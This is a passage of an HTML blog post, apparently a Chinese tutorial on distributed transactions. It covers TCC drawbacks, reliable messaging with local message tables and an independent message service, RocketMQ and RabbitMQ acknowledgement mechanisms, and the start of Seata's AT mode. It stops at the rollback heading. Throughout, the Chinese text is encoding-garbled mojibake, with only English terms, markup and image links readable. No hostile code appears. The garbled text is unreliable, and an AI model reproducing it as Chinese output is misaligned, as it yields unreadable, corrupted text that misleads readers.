<li>è¡¥å¿ï¼ˆCancelï¼‰ï¼šé‡Šæ”¾ä¹‹å‰å†»ç»“çš„é‡‘é¢ï¼Œå¹¶éå›æ»š<ul>
<li>ä½™é¢ä¸å˜ï¼Œä¿®æ”¹è´¦æˆ·å†»ç»“é‡‘é¢ä¸º0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ä¼˜åŠ¿å’Œç¼ºç‚¹"><a href="#ä¼˜åŠ¿å’Œç¼ºç‚¹" class="headerlink" title="ä¼˜åŠ¿å’Œç¼ºç‚¹"></a>ä¼˜åŠ¿å’Œç¼ºç‚¹</h4><ul>
<li><p>ä¼˜åŠ¿</p>
<p>TCCæ‰§è¡Œçš„æ¯ä¸€ä¸ªé˜¶æ®µéƒ½ä¼šæäº¤æœ¬åœ°äº‹åŠ¡å¹¶é‡Šæ”¾é”ï¼Œå¹¶ä¸éœ€è¦ç­‰å¾…å…¶å®ƒäº‹åŠ¡çš„æ‰§è¡Œç»“æœã€‚è€Œå¦‚æœå…¶å®ƒäº‹åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œæœ€åä¸æ˜¯å›æ»šï¼Œè€Œæ˜¯æ‰§è¡Œè¡¥å¿æ“ä½œã€‚è¿™æ ·å°±é¿å…äº†èµ„æºçš„é•¿æœŸé”å®šå’Œé˜»å¡ç­‰å¾…ï¼Œæ‰§è¡Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼Œå±äºæ€§èƒ½æœ€å¥½çš„åˆ†å¸ƒå¼äº‹åŠ¡æ–¹å¼ã€‚</p>
</li>
<li><p>ç¼ºç‚¹</p>
<ul>
<li>ä»£ç ä¾µå…¥ï¼šéœ€è¦äººä¸ºç¼–å†™ä»£ç å®ç°ï¼Œä»£ç ä¾µå…¥è¾ƒå¤š</li>
<li>å¼€å‘æˆæœ¬é«˜ï¼šä¸€ä¸ªä¸šåŠ¡éœ€è¦æ‹†åˆ†æˆ3ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«ç¼–å†™ä¸šåŠ¡å®ç°ï¼Œä¸šåŠ¡ç¼–å†™æ¯”è¾ƒå¤æ‚</li>
<li>å®‰å…¨æ€§è€ƒè™‘ï¼šcancelåŠ¨ä½œå¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œèµ„æºå°±æ— æ³•é‡Šæ”¾ï¼Œéœ€è¦å¼•å…¥é‡è¯•æœºåˆ¶ï¼Œè€Œé‡è¯•å¯èƒ½å¯¼è‡´é‡å¤æ‰§è¡Œï¼Œè¿˜è¦è€ƒè™‘é‡è¯•æ—¶çš„å¹‚ç­‰é—®é¢˜</li>
</ul>
</li>
</ul>
<h4 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h4><p>å¯¹äº‹åŠ¡æœ‰ä¸€å®šçš„ä¸€è‡´æ€§è¦æ±‚(æœ€ç»ˆä¸€è‡´); å¯¹æ€§èƒ½è¦æ±‚è¾ƒé«˜; å¼€å‘äººå‘˜éœ€è¦å…·å¤‡è¾ƒé«˜çš„ç¼–ç èƒ½åŠ›å’Œå¹‚ç­‰å¤„ç†ç»éªŒ;</p>
<h3 id="å¯é æ¶ˆæ¯æœåŠ¡"><a href="#å¯é æ¶ˆæ¯æœåŠ¡" class="headerlink" title="å¯é æ¶ˆæ¯æœåŠ¡"></a>å¯é æ¶ˆæ¯æœåŠ¡</h3><p>è¿™ç§å®ç°æ–¹å¼çš„æ€è·¯ï¼Œå…¶å®æ˜¯æºäºebayï¼Œå…¶åŸºæœ¬çš„è®¾è®¡æ€æƒ³æ˜¯å°†è¿œç¨‹åˆ†å¸ƒå¼äº‹åŠ¡æ‹†åˆ†æˆä¸€ç³»åˆ—çš„æœ¬åœ°äº‹åŠ¡ã€‚</p>
<h4 id="åŸºæœ¬åŸç†-1"><a href="#åŸºæœ¬åŸç†-1" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>ä¸€èˆ¬åˆ†ä¸ºäº‹åŠ¡çš„å‘èµ·è€…Aå’Œäº‹åŠ¡çš„å…¶å®ƒå‚ä¸è€…Bï¼š</p>
<ul>
<li>äº‹åŠ¡å‘èµ·è€…Aæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>äº‹åŠ¡å‘èµ·è€…Aé€šè¿‡MQå°†éœ€è¦æ‰§è¡Œçš„äº‹åŠ¡ä¿¡æ¯å‘é€ç»™äº‹åŠ¡å‚ä¸è€…B</li>
<li>äº‹åŠ¡å‚ä¸è€…Bæ¥æ”¶åˆ°æ¶ˆæ¯åæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149750.png" alt="image-20200305181454125"></p>
<p>è¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹åƒä½ å»å­¦æ ¡é£Ÿå ‚åƒé¥­ï¼š</p>
<ul>
<li>æ‹¿ç€é’±å»æ”¶é“¶å¤„ï¼Œç‚¹ä¸€ä»½çº¢çƒ§ç‰›è‚‰é¢ï¼Œä»˜é’±</li>
<li>æ”¶é“¶å¤„ç»™ä½ å‘ä¸€ä¸ªå°ç¥¨ï¼Œè¿˜æœ‰ä¸€ä¸ªå·ç‰Œï¼Œä½ åˆ«æŠŠç¥¨å¼„ä¸¢ï¼</li>
<li>ä½ å‡­å°ç¥¨å’Œå·ç‰Œä¸€å®šèƒ½é¢†åˆ°ä¸€ä»½çº¢çƒ§ç‰›è‚‰é¢ï¼Œä¸ç®¡éœ€è¦å¤šä¹…</li>
</ul>
<p>å‡ ä¸ªæ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>äº‹åŠ¡å‘èµ·è€…Aå¿…é¡»ç¡®ä¿æœ¬åœ°äº‹åŠ¡æˆåŠŸåï¼Œæ¶ˆæ¯ä¸€å®šå‘é€æˆåŠŸ</li>
<li>MQå¿…é¡»ä¿è¯æ¶ˆæ¯æ­£ç¡®æŠ•é€’å’ŒæŒä¹…åŒ–ä¿å­˜</li>
<li>äº‹åŠ¡å‚ä¸è€…Bå¿…é¡»ç¡®ä¿æ¶ˆæ¯æœ€ç»ˆä¸€å®šèƒ½æ¶ˆè´¹ï¼Œå¦‚æœå¤±è´¥éœ€è¦å¤šæ¬¡é‡è¯•</li>
<li>äº‹åŠ¡Bæ‰§è¡Œå¤±è´¥ï¼Œä¼šé‡è¯•ï¼Œä½†ä¸ä¼šå¯¼è‡´äº‹åŠ¡Aå›æ»š</li>
</ul>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•ä¿è¯æ¶ˆæ¯å‘é€ä¸€å®šæˆåŠŸï¼Ÿå¦‚ä½•ä¿è¯æ¶ˆè´¹è€…ä¸€å®šèƒ½æ”¶åˆ°æ¶ˆæ¯ï¼Ÿ</p>
<h4 id="æœ¬åœ°æ¶ˆæ¯è¡¨"><a href="#æœ¬åœ°æ¶ˆæ¯è¡¨" class="headerlink" title="æœ¬åœ°æ¶ˆæ¯è¡¨"></a>æœ¬åœ°æ¶ˆæ¯è¡¨</h4><p>ä¸ºäº†é¿å…æ¶ˆæ¯å‘é€å¤±è´¥æˆ–ä¸¢å¤±ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ä¸­ã€‚å®ç°æ—¶æœ‰ç®€åŒ–ç‰ˆæœ¬å’Œè§£è€¦åˆç‰ˆæœ¬ä¸¤ç§æ–¹å¼ã€‚</p>
<h5 id="ç®€åŒ–ç‰ˆæœ¬"><a href="#ç®€åŒ–ç‰ˆæœ¬" class="headerlink" title="ç®€åŒ–ç‰ˆæœ¬"></a>ç®€åŒ–ç‰ˆæœ¬</h5><p>åŸç†å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149751.png" alt="image-20200305183431211"> </p>
<ul>
<li><p>äº‹åŠ¡å‘èµ·è€…ï¼š</p>
<ul>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œäº‹åŠ¡ç›¸å…³ä¸šåŠ¡</li>
<li>å‘é€æ¶ˆæ¯åˆ°MQ</li>
<li>æŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼Œæ ‡è®°ä¸ºå·²å‘é€</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
</li>
<li><p>äº‹åŠ¡æ¥æ”¶è€…ï¼š</p>
<ul>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>å¤„ç†äº‹åŠ¡ç›¸å…³ä¸šåŠ¡</li>
<li>ä¿®æ”¹æ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¸ºå·²æ¶ˆè´¹</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
</li>
<li><p>é¢å¤–çš„å®šæ—¶ä»»åŠ¡</p>
<ul>
<li>å®šæ—¶æ‰«æè¡¨ä¸­è¶…æ—¶æœªæ¶ˆè´¹æ¶ˆæ¯ï¼Œé‡æ–°å‘é€</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸tccç›¸æ¯”ï¼Œå®ç°æ–¹å¼è¾ƒä¸ºç®€å•ï¼Œå¼€å‘æˆæœ¬ä½ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><p>æ•°æ®ä¸€è‡´æ€§å®Œå…¨ä¾èµ–äºæ¶ˆæ¯æœåŠ¡ï¼Œå› æ­¤æ¶ˆæ¯æœåŠ¡å¿…é¡»æ˜¯å¯é çš„ã€‚</p>
</li>
<li><p>éœ€è¦å¤„ç†è¢«åŠ¨ä¸šåŠ¡æ–¹çš„å¹‚ç­‰é—®é¢˜</p>
</li>
<li><p>è¢«åŠ¨ä¸šåŠ¡å¤±è´¥ä¸ä¼šå¯¼è‡´ä¸»åŠ¨ä¸šåŠ¡çš„å›æ»šï¼Œè€Œæ˜¯é‡è¯•è¢«åŠ¨çš„ä¸šåŠ¡</p>
</li>
<li><p><strong>äº‹åŠ¡ä¸šåŠ¡ä¸æ¶ˆæ¯å‘é€ä¸šåŠ¡è€¦åˆ</strong>ã€ä¸šåŠ¡æ•°æ®ä¸æ¶ˆæ¯è¡¨è¦åœ¨ä¸€èµ·</p>
</li>
</ul>
<h5 id="ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"><a href="#ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡" class="headerlink" title="ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"></a>ç‹¬ç«‹æ¶ˆæ¯æœåŠ¡</h5><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬ä¼šå¼•å…¥ä¸€ä¸ªç‹¬ç«‹çš„æ¶ˆæ¯æœåŠ¡ï¼Œæ¥å®Œæˆå¯¹æ¶ˆæ¯çš„æŒä¹…åŒ–ã€å‘é€ã€ç¡®è®¤ã€å¤±è´¥é‡è¯•ç­‰ä¸€ç³»åˆ—è¡Œä¸ºï¼Œå¤§æ¦‚çš„æ¨¡å‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149752.png" alt="image-20200305200131083"></p>
<p>ä¸€æ¬¡æ¶ˆæ¯å‘é€çš„æ—¶åºå›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149753.png" alt="image-20200305205430863"></p>
<p>äº‹åŠ¡å‘èµ·è€…Açš„åŸºæœ¬æ‰§è¡Œæ­¥éª¤ï¼š</p>
<ul>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå‡†å¤‡å‘é€æ¶ˆæ¯ï¼ˆæ¶ˆæ¯æœåŠ¡å°†æ¶ˆæ¯æŒä¹…åŒ–ï¼Œæ ‡è®°ä¸ºå‡†å¤‡å‘é€ï¼‰</li>
<li>æ‰§è¡Œæœ¬åœ°ä¸šåŠ¡ï¼Œ<ul>
<li>æ‰§è¡Œå¤±è´¥åˆ™ç»ˆæ­¢ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå–æ¶ˆå‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
<li>æ‰§è¡ŒæˆåŠŸåˆ™ç»§ç»­ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œç¡®è®¤å‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡å‘é€æ¶ˆæ¯ã€ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
</ul>
</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>æ¶ˆæ¯æœåŠ¡æœ¬èº«æä¾›ä¸‹é¢çš„æ¥å£ï¼š</p>
<ul>
<li>å‡†å¤‡å‘é€ï¼šæŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼Œå¹¶æ ‡è®°çŠ¶æ€ä¸ºå‡†å¤‡å‘é€</li>
<li>å–æ¶ˆå‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
<li>ç¡®è®¤å‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºç¡®è®¤å‘é€ã€‚å°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ç¡®è®¤æ¶ˆè´¹ï¼šæ¶ˆè´¹è€…å·²ç»æ¥æ”¶å¹¶å¤„ç†æ¶ˆæ¯ï¼ŒæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå·²æ¶ˆè´¹</li>
<li>å®šæ—¶ä»»åŠ¡ï¼šå®šæ—¶æ‰«ææ•°æ®åº“ä¸­çŠ¶æ€ä¸ºç¡®è®¤å‘é€çš„æ¶ˆæ¯ï¼Œç„¶åè¯¢é—®å¯¹åº”çš„äº‹åŠ¡å‘èµ·è€…ï¼Œäº‹åŠ¡ä¸šåŠ¡æ‰§è¡Œæ˜¯å¦æˆåŠŸï¼Œç»“æœï¼š<ul>
<li>ä¸šåŠ¡æ‰§è¡ŒæˆåŠŸï¼šå°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
</ul>
</li>
</ul>
<p>äº‹åŠ¡å‚ä¸è€…Bçš„åŸºæœ¬æ­¥éª¤ï¼š</p>
<ul>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œä¸šåŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œæ¶ˆæ¯å·²ç»æ¥æ”¶å’Œå¤„ç†</li>
<li>æäº¤äº‹åŠ¡</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>è§£é™¤äº†äº‹åŠ¡ä¸šåŠ¡ä¸æ¶ˆæ¯ç›¸å…³ä¸šåŠ¡çš„è€¦åˆ</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°èµ·æ¥æ¯”è¾ƒå¤æ‚</li>
</ul>
<h4 id="RocketMQäº‹åŠ¡æ¶ˆæ¯"><a href="#RocketMQäº‹åŠ¡æ¶ˆæ¯" class="headerlink" title="RocketMQäº‹åŠ¡æ¶ˆæ¯"></a>RocketMQäº‹åŠ¡æ¶ˆæ¯</h4><p>RocketMQæœ¬èº«è‡ªå¸¦äº†äº‹åŠ¡æ¶ˆæ¯ï¼Œå¯ä»¥ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ï¼ŒåŸç†å…¶å®å°±æ˜¯è‡ªå¸¦äº†æœ¬åœ°æ¶ˆæ¯è¡¨ï¼Œä¸æˆ‘ä»¬ä¸Šé¢è®²çš„æ€è·¯ç±»ä¼¼ã€‚</p>
<h4 id="RabbitMQçš„æ¶ˆæ¯ç¡®è®¤"><a href="#RabbitMQçš„æ¶ˆæ¯ç¡®è®¤" class="headerlink" title="RabbitMQçš„æ¶ˆæ¯ç¡®è®¤"></a>RabbitMQçš„æ¶ˆæ¯ç¡®è®¤</h4><p>RabbitMQç¡®ä¿æ¶ˆæ¯ä¸ä¸¢å¤±çš„æ€è·¯æ¯”è¾ƒå¥‡ç‰¹ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ä¼ ç»Ÿçš„æœ¬åœ°è¡¨ï¼Œè€Œæ˜¯åˆ©ç”¨äº†æ¶ˆæ¯çš„ç¡®è®¤æœºåˆ¶ï¼š</p>
<ul>
<li>ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶ï¼šç¡®ä¿æ¶ˆæ¯ä»ç”Ÿäº§è€…åˆ°è¾¾MQä¸ä¼šæœ‰é—®é¢˜<ul>
<li>æ¶ˆæ¯ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åˆ°RabbitMQæ—¶ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªå¼‚æ­¥çš„ç›‘å¬å™¨ï¼Œç›‘å¬æ¥è‡ªMQçš„ACK</li>
<li>MQæ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œä¼šè¿”å›ä¸€ä¸ªå›æ‰§ç»™ç”Ÿäº§è€…ï¼š<ul>
<li>æ¶ˆæ¯åˆ°è¾¾äº¤æ¢æœºåè·¯ç”±å¤±è´¥ï¼Œä¼šè¿”å›å¤±è´¥ACK</li>
<li>æ¶ˆæ¯è·¯ç”±æˆåŠŸï¼ŒæŒä¹…åŒ–å¤±è´¥ï¼Œä¼šè¿”å›å¤±è´¥ACK</li>
<li>æ¶ˆæ¯è·¯ç”±æˆåŠŸï¼ŒæŒä¹…åŒ–æˆåŠŸï¼Œä¼šè¿”å›æˆåŠŸACK</li>
</ul>
</li>
<li>ç”Ÿäº§è€…æå‰ç¼–å†™å¥½ä¸åŒå›æ‰§çš„å¤„ç†æ–¹å¼<ul>
<li>å¤±è´¥å›æ‰§ï¼šç­‰å¾…ä¸€å®šæ—¶é—´åé‡æ–°å‘é€</li>
<li>æˆåŠŸå›æ‰§ï¼šè®°å½•æ—¥å¿—ç­‰è¡Œä¸º</li>
</ul>
</li>
</ul>
</li>
<li>æ¶ˆè´¹è€…ç¡®è®¤æœºåˆ¶ï¼šç¡®ä¿æ¶ˆæ¯èƒ½å¤Ÿè¢«æ¶ˆè´¹è€…æ­£ç¡®æ¶ˆè´¹<ul>
<li>æ¶ˆè´¹è€…éœ€è¦åœ¨ç›‘å¬é˜Ÿåˆ—çš„æ—¶å€™æŒ‡å®šæ‰‹åŠ¨ACKæ¨¡å¼</li>
<li>RabbitMQæŠŠæ¶ˆæ¯æŠ•é€’ç»™æ¶ˆè´¹è€…åï¼Œä¼šç­‰å¾…æ¶ˆè´¹è€…ACKï¼Œæ¥æ”¶åˆ°ACKåæ‰åˆ é™¤æ¶ˆæ¯ï¼Œå¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°ACKæ¶ˆæ¯ä¼šä¸€ç›´ä¿ç•™åœ¨æœåŠ¡ç«¯ï¼Œå¦‚æœæ¶ˆè´¹è€…æ–­å¼€è¿æ¥æˆ–å¼‚å¸¸åï¼Œæ¶ˆæ¯ä¼šæŠ•é€’ç»™å…¶å®ƒæ¶ˆè´¹è€…ã€‚</li>
<li>æ¶ˆè´¹è€…å¤„ç†å®Œæ¶ˆæ¯ï¼Œæäº¤äº‹åŠ¡åï¼Œæ‰‹åŠ¨ACKã€‚å¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™ä¸ä¼šACKï¼Œä¸šåŠ¡å¤„ç†å¤±è´¥ï¼Œç­‰å¾…ä¸‹ä¸€æ¡æ¶ˆæ¯</li>
</ul>
</li>
</ul>
<p>ç»è¿‡ä¸Šé¢çš„ä¸¤ç§ç¡®è®¤æœºåˆ¶ï¼Œå¯ä»¥ç¡®ä¿ä»æ¶ˆæ¯ç”Ÿäº§è€…åˆ°æ¶ˆè´¹è€…çš„æ¶ˆæ¯å®‰å…¨ï¼Œå†ç»“åˆç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¸¤ç«¯çš„æœ¬åœ°äº‹åŠ¡ï¼Œå³å¯ä¿è¯ä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
<h4 id="æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹"><a href="#æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹"></a>æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹</h4><p>æ€»ç»“ä¸Šé¢çš„å‡ ç§æ¨¡å‹ï¼Œæ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¼˜ç‚¹ï¼š<ul>
<li>ç›¸å¯¹TCCï¼Œä»£ç ä¾µå…¥è¾ƒå°‘</li>
<li>ä¸šåŠ¡ç›¸å¯¹ç®€å•</li>
<li>æ˜¯å¤šä¸ªæœ¬åœ°äº‹åŠ¡çš„ç»“åˆï¼Œå› æ­¤èµ„æºé”å®šå‘¨æœŸçŸ­ï¼Œæ€§èƒ½å¥½</li>
</ul>
</li>
<li>ç¼ºç‚¹ï¼š<ul>
<li>ä¾èµ–äºMQçš„å¯é æ€§</li>
<li>æ¶ˆæ¯å‘èµ·è€…å¯ä»¥å›æ»šï¼Œä½†æ˜¯æ¶ˆæ¯å‚ä¸è€…æ— æ³•å¼•èµ·äº‹åŠ¡å›æ»š</li>
<li>äº‹åŠ¡æ—¶æ•ˆæ€§å·®ï¼Œå–å†³äºMQæ¶ˆæ¯å‘é€æ˜¯å¦åŠæ—¶ï¼Œè¿˜æœ‰æ¶ˆæ¯å‚ä¸è€…çš„æ‰§è¡Œæƒ…å†µ</li>
</ul>
</li>
</ul>
<p>é’ˆå¯¹äº‹åŠ¡æ— æ³•å›æ»šçš„é—®é¢˜ï¼Œæœ‰äººæå‡ºè¯´å¯ä»¥å†äº‹åŠ¡å‚ä¸è€…æ‰§è¡Œå¤±è´¥åï¼Œå†æ¬¡åˆ©ç”¨MQé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œç„¶åç”±æ¶ˆæ¯æœåŠ¡é€šçŸ¥å…¶ä»–å‚ä¸è€…å›æ»šã€‚é‚£ä¹ˆï¼Œæ­å–œä½ ï¼Œä½ åˆ©ç”¨MQå’Œè‡ªå®šä¹‰çš„æ¶ˆæ¯æœåŠ¡å†æ¬¡å®ç°äº†2PC æ¨¡å‹ï¼Œåˆé€ äº†ä¸€ä¸ªå¤§è½®å­</p>
<h3 id="ATæ¨¡å¼"><a href="#ATæ¨¡å¼" class="headerlink" title="ATæ¨¡å¼"></a>ATæ¨¡å¼</h3><p>2019å¹´ 1 æœˆä»½ï¼ŒSeata å¼€æºäº† AT æ¨¡å¼ã€‚AT æ¨¡å¼æ˜¯ä¸€ç§<strong>æ— ä¾µå…¥</strong>çš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚å¯ä»¥çœ‹åšæ˜¯å¯¹TCCæ¨¡å‹çš„ä¸€ç§ä¼˜åŒ–ï¼Œè§£å†³äº†TCCæ¨¡å¼ä¸­çš„ä»£ç ä¾µå…¥ã€ç¼–ç å¤æ‚ç­‰é—®é¢˜ã€‚</p>
<p>åœ¨ AT æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·åªéœ€å…³æ³¨è‡ªå·±çš„â€œä¸šåŠ¡ SQLâ€ï¼Œç”¨æˆ·çš„ â€œä¸šåŠ¡ SQLâ€ ä½œä¸ºä¸€é˜¶æ®µï¼ŒSeata æ¡†æ¶ä¼šè‡ªåŠ¨ç”Ÿæˆäº‹åŠ¡çš„äºŒé˜¶æ®µæäº¤å’Œå›æ»šæ“ä½œã€‚</p>
<p>å¯ä»¥å‚è€ƒSeataçš„<a href="https://seata.io/zh-cn/docs/dev/mode/at-mode.html">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h4 id="åŸºæœ¬åŸç†-2"><a href="#åŸºæœ¬åŸç†-2" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>å…ˆæ¥çœ‹ä¸€å¼ æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149754.png" alt="image-20200305212340203"></p>
<p>æœ‰æ²¡æœ‰æ„Ÿè§‰è·ŸTCCçš„æ‰§è¡Œå¾ˆåƒï¼Œéƒ½æ˜¯åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>ä¸€é˜¶æ®µï¼šæ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœ</li>
<li>äºŒé˜¶æ®µï¼šæ ¹æ®ä¸€é˜¶æ®µçš„ç»“æœï¼Œåˆ¤æ–­äºŒé˜¶æ®µåšæ³•ï¼šæäº¤æˆ–å›æ»š</li>
</ul>
<p>ä½†ATæ¨¡å¼åº•å±‚åšçš„äº‹æƒ…å¯å®Œå…¨ä¸åŒï¼Œè€Œä¸”ç¬¬äºŒé˜¶æ®µæ ¹æœ¬ä¸éœ€è¦æˆ‘ä»¬ç¼–å†™ï¼Œå…¨éƒ¨æœ‰Seataè‡ªå·±å®ç°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬å†™çš„<strong>ä»£ç ä¸æœ¬åœ°äº‹åŠ¡æ—¶ä»£ç ä¸€æ ·</strong>ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡ã€‚</p>
<p>é‚£ä¹ˆï¼ŒATæ¨¡å¼å¦‚ä½•å®ç°æ— ä»£ç ä¾µå…¥ï¼Œå¦‚ä½•å¸®æˆ‘ä»¬è‡ªåŠ¨å®ç°äºŒé˜¶æ®µä»£ç çš„å‘¢ï¼Ÿ</p>
<blockquote>
<p>ä¸€é˜¶æ®µ</p>
</blockquote>
<p>åœ¨ä¸€é˜¶æ®µï¼ŒSeata ä¼šæ‹¦æˆªâ€œä¸šåŠ¡ SQLâ€ï¼Œé¦–å…ˆè§£æ SQL è¯­ä¹‰ï¼Œæ‰¾åˆ°â€œ<code>ä¸šåŠ¡ SQL</code>â€è¦æ›´æ–°çš„ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®è¢«æ›´æ–°å‰ï¼Œå°†å…¶ä¿å­˜æˆâ€œ<code>before image</code>â€ï¼Œç„¶åæ‰§è¡Œâ€œ<code>ä¸šåŠ¡ SQL</code>â€æ›´æ–°ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®æ›´æ–°ä¹‹åï¼Œå†å°†å…¶ä¿å­˜æˆâ€œ<code>after image</code>â€ï¼Œæœ€åè·å–å…¨å±€è¡Œé”ï¼Œ<strong>æäº¤äº‹åŠ¡</strong>ã€‚ä»¥ä¸Šæ“ä½œå…¨éƒ¨åœ¨ä¸€ä¸ªæ•°æ®åº“äº‹åŠ¡å†…å®Œæˆï¼Œè¿™æ ·ä¿è¯äº†ä¸€é˜¶æ®µæ“ä½œçš„åŸå­æ€§ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149755.png" alt="image-20200305213652558"></p>
<blockquote>
<p>äºŒé˜¶æ®µæäº¤</p>
</blockquote>
<p>äºŒé˜¶æ®µå¦‚æœæ˜¯æäº¤çš„è¯ï¼Œå› ä¸ºâ€œ<code>ä¸šåŠ¡ SQL</code>â€åœ¨ä¸€é˜¶æ®µå·²ç»æäº¤è‡³æ•°æ®åº“ï¼Œ æ‰€ä»¥ Seata æ¡†æ¶åªéœ€å°†ä¸€é˜¶æ®µä¿å­˜çš„å¿«ç…§æ•°æ®å’Œè¡Œé”åˆ æ‰ï¼Œå®Œæˆæ•°æ®æ¸…ç†å³å¯ã€‚</p>
<blockquote>
<p>äºŒé˜¶æ®µå›æ»šï¼š</p>
</blockquote>
